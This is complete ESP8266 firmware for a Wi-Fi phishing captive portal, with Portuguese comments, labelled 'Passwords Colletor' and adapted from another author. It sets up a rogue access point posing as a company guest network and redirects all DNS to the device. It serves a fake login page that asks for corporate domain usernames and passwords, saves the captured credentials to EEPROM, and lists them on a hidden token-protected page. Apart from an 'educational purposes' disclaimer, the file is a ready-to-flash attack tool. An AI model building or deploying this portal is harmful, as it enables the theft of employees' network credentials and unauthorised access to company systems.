// Codigo para ESP8266 Wifi Captive Portal.
// Originally written by adamff-dev
// Changed by NoceraInfosec
// Only for educational purposes! you have been warned!
// Wifi Pshishing Attack! - Passwords Colletor!

// Adicionando Bibliotecas.
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Senha para acessar a página PASS
const char* PASSWORD = "P@ssw0rd!";

// Textos padrão.
#define SUBTITLE "A internet da EMPRESA!"
#define TITLE "Acesso GUEST"
#define BODY "Para se conectar a nossa rede insira seu login de rede. Aproveite a internet mais rápida da EMPRESA!"
#define POST_TITLE "Conectando..."
#define POST_BODY "Caso seu acesso seja recusado, </br>comunique seu supervisor, Aguarde... </br></br> Obrigado!"
#define PASS_TITLE "Credenciais"
#define CLEAR_TITLE "Zeradas"

// Configurações Iniciais do Sistema.
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

// Nome padrão da Rede Wifi.
const char *SSID_NAME = "EMPRESA - GuestWifi";

String allPass = "";     // Para guardar todas as senhas.
String newSSID = "";     // Para adicionar um novo SSID.
String currentSSID = ""; // Para guardar o SSID na EEPROM.

// Para guardar o SSID na EEPROM.
int initialCheckLocation = 20; // Localização para checar se o ESP8266 está rodando pela primeira vez.
int passStart = 30;            // Localização inicial na EEPROM para salvar as senhas.
int passEnd = passStart;       // Localização final na EEPROM para salvar as senhas.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName)
{
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer()
{
  return "</div><div class=q><a>&#169; 2023 Empresa. </br> Todos os direitos Reservados.</a></div>";
}

String header(String t)
{
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #7F5C57; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" +
             a + " :: " + t + "</title>"
                              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                              "<style>" +
             CSS + "</style>"
                   "<meta charset=\"UTF-8\"></head>"
                   "<body><nav><b>" +
             a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String index()
{
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>Login de rede: EMPRESA\\Usuário </label>" +
         "<input type=text name=u></input><label>Senha:</label>" +
         "<input type=password name=m></input><input type=submit value=Conectar></form>" + footer();
}


String posted()
{
  String username = input("u");
  String password = input("m");

  // Adicionando ambos usuário e senha em listas ordenadas.
  String userPassEntry = "<li><b>Usuário:</b> " + username + "</li><li><b>Senha:</b> " + password + "</li>";
  allPass += userPassEntry; // Atualizando todas as credenciais.

  // Gravando usuário e senha na EEPROM.
  for (int i = 0; i <= userPassEntry.length(); ++i)
  {
    EEPROM.write(passEnd + i, userPassEntry[i]); // Adicionando usuário e senha na EEPROM.
  }

  passEnd += userPassEntry.length(); // Atualizando posição final das senhas na EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}


String pass()
{
  // Confira se a senha foi informada nos parametros URL
  if (webServer.hasArg("password") && webServer.arg("password") == PASSWORD)
  {
    // Senha correta, mostre a página de senhas
    return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar ao início</a></p><p><a style=\"color:blue\" href=/clear>Limpar senhas</a></p></center>" + footer();
  }
  else
  {
    // Senha Incorreta, Mostre página de Senha
    return header("Área Protegida!") + "<p>Somente pessoal autorizado!</p><form action=\"/pass\" method=\"GET\"><label>TOKEN:</label><input type=\"password\" name=\"password\"><input type=\"submit\" value=\"Acessar\"></form>" + footer();
  }
}

String ssid()
{
  return header("Alterar SSID") + "<p>Aqi você pode definir outro SSID. Após pressional o botão \"Alterar SSID\" sua conexão será reiniciada.</p>" + "<form action=/postSSID method=post><label>Novo SSID:</label>" +
         "<input type=text name=s></input><input type=submit value=\"Alterar SSID\"></form>" + footer();
}

String postedSSID()
{
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i)
  {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return newSSID;
}

String clear()
{
  allPass = "";
  passEnd = passStart; // Setando posição final das senhas -> Posição Inicial.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>A lista de senhas foi apagada com sucesso!</div></p><center><a style=\"color:blue\" href=/>Voltar ao Início</a></center>" + footer();
}

void BLINK()
{
  // O LED_DO_ESP8266 irá piscar 5 vezes cada vez que uma senha for capturada.
  for (int counter = 0; counter < 10; counter++)
  {
    // pro LED piscar.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup()
{
  // Iniciando Comunicação SERIAL.
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Checando se o ESP8266 está rodando pela primeira vez.
  String checkValue = "first"; // Isto aqui vai ser configurado na EEPROM depois da primeira vez que o ESP8266 rodar.

  for (int i = 0; i < checkValue.length(); ++i)
  {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i])
    {
      // Adicionar "first" em initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i)
      {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');         // Limpar localização SSID na EEPROM.
      EEPROM.write(passStart, '\0'); // Limpar a localização das senhas na EEPROM.
      EEPROM.commit();
      break;
    }
  }

  // Ler SSID na EEPROM.
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0')
  {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Lendo local das credênciais e a localização final na EEPROM.
  while (EEPROM.read(passEnd) != '\0')
  {
    allPass += char(EEPROM.read(passEnd)); // Lendo credêncial salva na EEPROM.
    passEnd++;                             // Atualizando local final da senha na EEPROM.
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  // Alterando SSIDatual (currentSSID) -> SSID na EEPROM ou o padrão que estava configurado.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("SSID Atual: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  // Iniciar WebServer
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Somente para HTTP)
  webServer.on("/post", []() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/ssid", []() { webServer.send(HTTP_CODE, "text/html", ssid()); });
  webServer.on("/postSSID", []() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
  webServer.on("/pass", []() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.on("/clear", []() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();

  // Habilitar LED_NO_ESP8266.
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop()
{
  if ((millis() - lastTick) > TICK_TIMER)
  {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
